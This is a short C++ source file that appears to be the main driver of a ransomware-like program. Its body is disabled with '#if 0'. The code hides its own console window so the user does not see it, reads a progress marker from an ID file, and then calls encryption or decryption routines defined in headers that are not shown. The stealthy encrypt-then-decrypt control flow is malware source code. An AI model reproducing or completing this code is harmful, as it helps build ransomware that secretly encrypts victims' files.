#include "Encryption.h"
#include "Decryption.h"
#include <boost/filesystem.hpp>
#include "Utils.h"
#if 0
bool FileExist(const std::string& Name)
{
	return boost::filesystem::exists(Name);
}

void hideWindow()
{
	HWND window;
	AllocConsole();
	window = FindWindowA("ConsoleWindowClass", NULL);
	ShowWindow(window, 0);
}

int main()
{
	hideWindow();
	std::ifstream idFile;
	char c;
	string pathToID = get_path_to_id();

	

	if(FileExist(pathToID))
	{
		idFile.open(pathToID, std::ios::binary);
		idFile.get(c);
		idFile.close();
		if(c == FINISHED_ENCRYPTION)
		{
			decryption_main();
		}
		else if(c == NOT_FINISHED_ENCRYPTION)
		{
			encryption_main(false);
		}
		else
		{
			std::cout << "ERROR" << std::endl;
		}
		
		
	}
	else
	{
		encryption_main(true);
	}

}
#endif